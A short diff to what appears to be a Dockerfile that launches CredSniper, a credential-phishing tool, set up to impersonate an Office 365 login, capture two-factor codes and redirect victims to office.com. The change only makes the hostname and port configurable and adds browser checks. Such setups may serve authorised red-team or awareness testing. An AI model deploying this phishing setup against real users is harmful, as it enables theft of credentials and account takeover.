@@ -24,4 +24,4 @@ RUN pip install --no-cache-dir -r /app/requirements.txt
 EXPOSE 8080
 
 # Default command – run CredSniper with env vars
-CMD ["python", "-u", "CredSniper/credsniper.py", "--module", "office365", "--twofactor", "--final", "https://www.office.com", "--hostname", "example.com", "--port", "8080"] 
+CMD ["/bin/sh","-c","chromium --version && chromedriver --version && python -u CredSniper/credsniper.py --module office365 --twofactor --final https://www.office.com --hostname ${HOSTNAME_ENV:-example.com} --port ${PORT:-8080}"] 
